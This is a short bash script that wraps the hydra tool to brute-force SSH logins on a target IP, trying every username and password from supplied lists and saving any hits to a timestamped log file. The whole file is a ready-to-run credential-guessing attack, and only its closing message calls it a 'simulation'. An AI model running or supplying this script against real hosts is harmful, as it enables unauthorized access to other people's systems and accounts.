#!/bin/bash

# Use: ./bruteforce_ssh.sh <target_ip> <username_list> <password_list>

TARGET=$1
USERLIST=$2
PASSLIST=$3

# Parameter check
if [ "$#" -ne 3 ]; then
    echo "Use: $0 <target_ip> <username_list> <password_list>"
    echo "Example: $0 192.168.1.100 users.txt passwords.txt"
    exit 1
fi

# Check if hydra is installed
if ! command -v hydra &> /dev/null; then
    echo "Hydra is not installed. Install with: sudo apt install hydra"
    exit 1
fi

# Create logfile name with timestamp
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
LOGFILE="hydra_ssh_log_${TARGET}_$TIMESTAMP.txt"

# Start brute force
echo "Starting brute force SSH attack against $TARGET ..."
echo "Using usernames from $USERLIST and passwords from $PASSLIST"
echo "Logging output to $LOGFILE"
echo ""

hydra -L "$USERLIST" -P "$PASSLIST" ssh://$TARGET -t 4 -V -o "$LOGFILE"

echo ""
echo "Brute force simulation completed. See results in: $LOGFILE"
